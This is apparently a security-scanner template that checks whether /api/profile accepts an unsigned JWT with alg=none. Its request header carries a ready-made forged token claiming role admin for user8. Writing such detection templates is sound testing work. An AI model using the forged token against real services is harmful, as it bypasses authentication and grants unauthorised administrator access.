id: jwt-09
name: 'JWT none-alg kid key-8'
severity: critical
type: active
tags:
  - jwt
  - auth
  - none
description: 'Unsigned alg=none token accepted on /api/profile'
requests:
  - method: GET
    path: '{{BaseURL}}/api/profile'
    match-all: true
    sendHeaders:
      Authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyOCIsInJvbGUiOiJhZG1pbiIsImtpZCI6ImtleS04In0.'
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - 'admin'
